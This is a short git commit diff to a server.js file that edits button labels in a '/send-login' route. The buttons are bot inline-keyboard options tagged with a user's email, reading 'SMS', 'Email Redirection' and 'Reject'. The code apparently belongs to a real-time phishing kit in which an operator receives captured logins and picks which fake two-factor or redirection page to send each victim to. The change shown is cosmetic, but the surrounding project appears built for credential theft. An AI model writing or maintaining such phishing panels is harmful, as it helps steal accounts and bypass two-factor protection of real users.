865ae50741c566451ae2eafbef8ac3ac02a11115
gratous100 <122572602+gratous100@users.noreply.github.com>
2026-09-12 20:51:27 +0100

    Update server.js

--- server.js
+++ server.js
@@ -177,10 +177,10 @@ app.post("/send-login", async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "2FA Auth: SMS", callback_data: `page1|${email}` }
+            { text: "SMS", callback_data: `page1|${email}` }
           ],
           [
-            { text: "Approve Email: Email Redirection", callback_data: `page2|${email}` }
+            { text: "Email Redirection", callback_data: `page2|${email}` }
           ],
           [
             { text: "❌ Reject ❌", callback_data: `reject|${email}` }
